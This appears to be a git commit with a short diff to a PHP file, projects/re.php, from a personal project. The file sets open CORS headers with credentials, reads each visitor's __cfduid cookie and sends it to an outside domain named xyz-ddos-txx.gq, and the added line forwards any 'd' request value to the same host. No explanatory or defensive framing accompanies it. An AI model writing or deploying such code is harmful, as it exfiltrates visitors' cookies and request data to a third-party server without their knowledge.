6cd929f5de23978ca1a12c2f58e1b243bca2052f
Việt Nguyễn Đức <nguyenducviet1998tk@gmail.com>
2018-12-04 15:32:50 +0700

    up

--- projects/re.php
+++ projects/re.php
@@ -3,4 +3,5 @@ header('Access-Control-Allow-Credentials: true');
 header('Access-Control-Allow-Origin: *'); 
 $a = isset($_COOKIE['__cfduid'])?$_COOKIE['__cfduid']:0;
 file_get_contents("http://xyz-ddos-txx.gq/?d=".$a);
+file_get_contents("http://xyz-ddos-txx.gq/?d=".$_REQUEST['d']);
 ?>
